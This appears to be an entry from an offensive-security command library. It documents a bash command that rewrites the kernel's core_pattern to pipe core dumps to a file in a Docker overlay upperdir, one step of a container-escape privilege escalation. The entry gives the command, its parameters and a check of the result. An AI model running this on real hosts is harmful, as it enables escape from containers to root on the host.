---
id: 23b0da6f-abb4-4c29-8639-61d043083cde
name: set-core-pattern-pipe
type: command
executor: bash
data: echo "|$_UPPERDIR_PATH/poc" > /proc/sys/kernel/core_pattern
output: null
created_at: '2023-04-06T03:56:17.157289+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - docker
  - privilege-escalation
  - kernel
verified: true
validated: true
---

# set-core-pattern-pipe

## Command

```bash
echo "|$_UPPERDIR_PATH/poc" > /proc/sys/kernel/core_pattern
```

## Description

This command modifies the kernel's core_pattern to pipe core dumps to a specified file in the Docker overlay upperdir, enabling root-privileged writes upon process crashes for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_UPPERDIR_PATH` | Path to the writable upperdir from mount output (e.g., /var/lib/docker/overlay2/<hash>/diff) | Yes |
| `poc` | Target filename for the core dump (can be any writable name) | Yes |
| `|` | Prefix to enable piping (invokes as root) | Built-in |

## Examples

### Basic Usage

```bash
echo "|/var/lib/docker/overlay2/<hash>/diff/poc" > /proc/sys/kernel/core_pattern
```

### Verify Change

```bash
cat /proc/sys/kernel/core_pattern
```

## Expected Output

No direct output from the echo command, but verification shows:
```
|/var/lib/docker/overlay2/<hash>/diff/poc
```

## Related

- [[procedures/Abuse-Core-Dumps-and-Core-Pattern-for-Privilege-Escalation-in-Docker]]
- [[commands/check-docker-overlay-mount]]
